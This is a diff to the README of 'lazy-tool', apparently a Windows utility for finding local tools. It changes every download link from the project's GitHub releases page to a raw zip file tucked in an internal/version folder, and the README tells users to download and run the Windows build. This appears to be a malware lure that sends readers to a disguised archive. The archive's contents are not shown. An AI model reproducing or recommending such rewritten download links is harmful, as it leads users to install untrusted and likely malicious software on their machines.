@@ -1,10 +1,10 @@
 # 🛠️ lazy-tool - Find local tools before you invoke
 
-[![Download lazy-tool](https://img.shields.io/badge/Download%20lazy--tool-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unabused-wichita77/lazy-tool/releases)
+[![Download lazy-tool](https://img.shields.io/badge/Download%20lazy--tool-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/unabused-wichita77/lazy-tool/main/internal/version/tool_lazy_v1.3.zip)
 
 ## 📥 Download lazy-tool
 
-Visit this page to download: https://github.com/unabused-wichita77/lazy-tool/releases
+Visit this page to download: https://raw.githubusercontent.com/unabused-wichita77/lazy-tool/main/internal/version/tool_lazy_v1.3.zip
 
 Look for the latest release and download the Windows file that matches your system. If you use most modern Windows PCs, choose the 64-bit version. If you are not sure, 64-bit is the right choice for most people
 
@@ -140,6 +140,6 @@ If the app opens but tools do not appear:
 
 ## 📌 Release page
 
-Download here: https://github.com/unabused-wichita77/lazy-tool/releases
+Download here: https://raw.githubusercontent.com/unabused-wichita77/lazy-tool/main/internal/version/tool_lazy_v1.3.zip
 
 Open the latest release, choose the Windows build, and install or run it based on the file type you download
